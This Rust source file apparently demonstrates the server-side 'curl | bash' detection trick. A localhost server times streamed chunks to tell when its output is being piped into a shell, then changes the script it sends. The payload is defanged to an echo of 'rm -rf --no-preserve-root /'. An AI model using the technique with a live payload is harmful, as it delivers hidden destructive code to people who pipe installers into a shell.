use async_stream::stream;
use bytes::Bytes;
use flareon::request::Request;
use flareon::router::Route;
use flareon::{Body, Error, FlareonApp, FlareonProject, Response, StatusCode};
use statrs::statistics::Statistics;
use tokio::net::TcpSocket;

const MAX_CONNECTIONS: u32 = 128;
const SEND_BUFFER_SIZE: u32 = 87380;
const NANOS_IN_SEC: f64 = 1_000_000_000.0;
const CHUNK_NUM: usize = 128;

async fn return_payload(_request: Request) -> Result<Response, Error> {
    let s = stream! {
        yield Ok(Bytes::from("echo Hello!\nsleep 2\n"));

        let mut times = Vec::new();
        let mut last = chrono::Local::now();
        for _i in 0..CHUNK_NUM {
            yield Ok(Bytes::from_static(&[0u8; SEND_BUFFER_SIZE as usize]));

            let now = chrono::Local::now();
            let diff = now - last;
            times.push(diff.num_seconds() as f64 + diff.subsec_nanos() as f64 / NANOS_IN_SEC);
            last = now;
        }
            
        times.sort_by(|a, b| a.total_cmp(b));
        let max = times.pop().unwrap();
        let variance = times.variance();

        println!("Max: {}, variance: {}", max, variance);
        if max > 1.0 && variance < 0.1 {
            println!("Detected curl | bash! ");
            yield Ok(Bytes::from("echo running rm -rf --no-preserve-root /...\n"));
        } else {
            println!("No curl | bash");
            yield Ok(Bytes::from("echo nothing to do...\n"));
        }
    };

    Ok(Response::new_html(StatusCode::OK, Body::streaming(s)))
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let attack_app = FlareonApp::builder()
        .urls([Route::with_handler("/", return_payload)])
        .build()?;

    let flareon_project = FlareonProject::builder()
        .register_app_with_views(attack_app, "")
        .build();

    let addr = "127.0.0.1:8000".parse()?;
    let socket = TcpSocket::new_v4()?;
    socket.set_reuseaddr(true)?;
    socket.set_reuseport(true)?;
    socket.set_nodelay(true)?;
    socket.bind(addr)?;
    socket.set_send_buffer_size(SEND_BUFFER_SIZE)?;

    flareon::run_at(flareon_project, socket.listen(MAX_CONNECTIONS)?).await?;

    Ok(())
}
